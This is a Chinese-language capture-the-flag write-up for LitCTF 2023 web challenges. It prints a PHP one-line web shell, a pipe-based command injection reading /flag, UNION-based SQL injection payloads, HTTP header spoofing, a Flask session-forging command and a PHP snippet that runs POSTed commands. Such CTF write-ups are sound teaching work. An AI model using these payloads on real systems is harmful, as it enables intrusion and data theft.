---
title: "LitCTF-2023"
date: 2023-06-17
categories: 
  - "ctf"
tags: 
  - "ctf"
  - "litctf"
---

## 我flag呢？

进去之后页面是这样

![](./images/image-30.png)

先看看网页源码呢

![](./images/image-31.png)

在注释里拿到flag

源码里也有一段彩蛋

## **导弹迷踪**

进去之后好像是一个小游戏

![](./images/image-32.png)

先审查一下源码

![](./images/image-33.png)

在最下面看到Game files

查看一下game.js

发现flag

![](./images/image-34.png)

## Follow me and hack me

![](./images/image-35.png)

没啥难度

直接上hackbar就行

![](./images/image-36.png)

似乎备份文件里有什么东西，去看看

试试常用的备份文件

发现有/www.zip，在index.php.bak里发现一个彩蛋

![](./images/image-37.png)

## Vim yyds

![](./images/image-38.png)

只知道VIM是个编辑器，然后去查了一下信息

vim编辑的index.php文件，在编辑状态强制退出终端，会在同目录下产生一个.index.php.swp文件，我们可以使用vim -r .index.php.swp恢复文件

```
<?php
            error_reporting(0);
            $password = "Give_Me_Your_Flag";
            echo "<p>can can need Vim </p>";
            if ($_POST['password'] === base64_encode($password)) {
                echo "<p>Oh You got my password!</p>";
                eval(system($_POST['cmd']));
            }
            ?>
```

POST一个base64加密后的password，再POST一个cmd执行命令就行

## PHP是世界上最好的语言！！

进去之后好像是一个转化工具

![](./images/image-39.png)

猜测有可能是命令执行，在右边随便试试，

run一下system("ls /");目录就爆出来了

然后直接cat flag就行

这道题似乎没有过滤什么东西

## 作业管理系统

进去就是一个登录，试试用admin，admin登录，进去之后如下

![](./images/image-40.png)

下面有个创建文件，随便创建一个1.php，然后编辑一下

```
<?php @eval($_POST['hyh']);?>
```

然后蚁剑连起来

在根目录下拿到flag

## Ping

![](./images/image-41.png)

简单的前端绕过，把check\_ip删了就行

然后直接进行命令执行就就行

```
127.0.0.1|ls  /  =>  127.0.0.1|cat /flag
```

拿到flag

## 这是什么？SQL ！注一下 ！

提示如下，居然套这么多层。。。。

![](./images/image-42.png)

先进行常规注入，再password里发现一段彩蛋

好像flag就不在这个数据库里面

那就重新来过

爆一下库名：

```
-1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata--+
```

还有一个ctftraining库，flag应该是在这个库里面

里面也有一张flag表，这个时候要拿到flag字段的时候就要指明数据库了，不然他只会查默认那个库

拿到flag：

```
-1)))))) and 1=2 union select 1,group_concat(flag) from ctftraining.flag--+
```

## Http pro max plus

这道题考的是和HTTP相关的

直接上burpsuite

![](./images/image-43.png)

试试X-Forwarded-For头，结果被发现了！

然后再试试Client-Ip：127.0.0.1

来到下一关

![](./images/image-44.png)

作者为什么要选这个网站。。。。

看见from就想到referer了，添加一个referer头绕过

来到下一关

![](data:image/png;base64,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zZs3z377rXzHtVSpY8eO9tBDD9ns2bNTXVqrv2/UqJFts802ThR///13V9e11lrL7TD32muvRdadDm/QoEH24IMP2scff1xxDcJ42WWXuY3658yZYzvvvLN16NDBhg8f7oS5fv36dvPNN7t/p00r3wkvp+xwQBbsRG2wv99++7ky+XK1adPGPvroIxs/frx16dLFNtxwQ/v2229dPquvvroT/FtvvbWiE+DzKLGmI/jyyy/LYt5LXfk4Wqtdu3ZGvYKJ57377rv21FNPuWuVRGB5EKgxInzyySfbm2++aZMnT67E6aqrrrLzzz9/sdM7brnlFrv88sutuLi4ylz32Wcf96O96KKLqnxvHG9ALPfee28bOnSoffPNN66IZ5xxhr3zzjs2YcKEyCKzIf7gwYPtq6++qvQ925Qicn/88YftuOOOts4667itS0nbbbed7b///jZx4sSKe/Lz8x3LSy+91L744otKeZHP+++/X9GmJ554os2cOdNefvll23rrrW2rrbay6667zt2zxx57GPuRsCteMLF5P3XCEscyp4Po37+/XX311U6ghwwZYhdccIET+l9++aVCbCl7ixYt7L777otjk6lMWUSgxojwgAED3A+0KiLM3sZRFljnzp3djxqLEMsaC/vFF190/5I4MHSnnXZyp4PUhoQY0aHcf//99vbbb7sqIXCbbbaZ23wfS5XDUVdeeWX7+eef3feIGczDJ6OwIRPiiejtsMMOtu6661aI8DnnnOP+/umnn9I6WgrOWNq+TRHhqVOn2uuvv26MZLDggyJM+caOHVupSU499VR7/PHH7YMPPrCRI0c6C/7ss8+2a6+91rB0OWTgkUceWawZU4nweeed5yzu2tIR14b3uLbWocaIMD/Qt956q9oi3KNHDzdExdJDfFu1auUOB2VYisD4xIkctUWEqdOKK65ov/76q7MwWUaOmwBx5r9YyljEu+++u7MMcVPAgtFHWIQR52OOOcb+/PNPZwmvt956TrBhilU8btw4J+7k+fzzz7uOM1Hi5BPK5V0e2267rXNF4MqgoywoKLBXXnnF3Y6gfv3114tZrpQRyxsRRnjpOBgZXX/99darVy9XHto5nFKJMO8HLgpOClcSgUwSqDEifNJJJ9msWbOqJcJ5eXl21llnuWE2guTTmmuu6YSY4XptEmGseSxLhuEkBBhfboMG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)

user-agent：Chrome

下一关

![](./images/image-45.png)

哦？这是新东西，没见过，到处查资料，幸好有万能的GPT

添加一个Via 头

![](./images/image-46.png)

出现一个php，进去看看

发现源码

![](./images/image-47.png)

在另一个php中得到flag

## 就当无事发生

![](./images/image-48.png)

在GitHub源码里，拿到flag

![](./images/image-49.png)

## 1zjs

一个魔方游戏，我不会玩魔方。。

![](./images/image-50.png)

万事先看看源码

在一个js文件里发现flag.php

![](./images/image-51.png)

进去看看，全是括号

![](./images/image-52.png)

不过这道题叫js，应该是与js有关，但是看着好像又不是js代码， 查询资料后发现是 jsfuck类型的代码

直接去解码或者在控制台跑一下就行了

![](./images/image-53.png)

## Flag点击就送！

随便输入一个名字，发现响应头里有session

![](./images/image-54.png)

把这段session拿去jwt.io解密一下

![](./images/image-55.png)

那么就要伪造session了

在伪造session之前要知道key值

flask框架的session是存储在客户端的，那么就需要解决session是否会被恶意纂改的问题，而flask通过一个secret\_key，也就是密钥对数据进行签名来防止session被纂改。

使用脚本加密一下

```
python flask_session_cookie_manager3.py encode -s 'LitCTF' -t '{"name":"admin"}'
```

再抓包修改，即可伪造为admin管理员登录，拿到flag
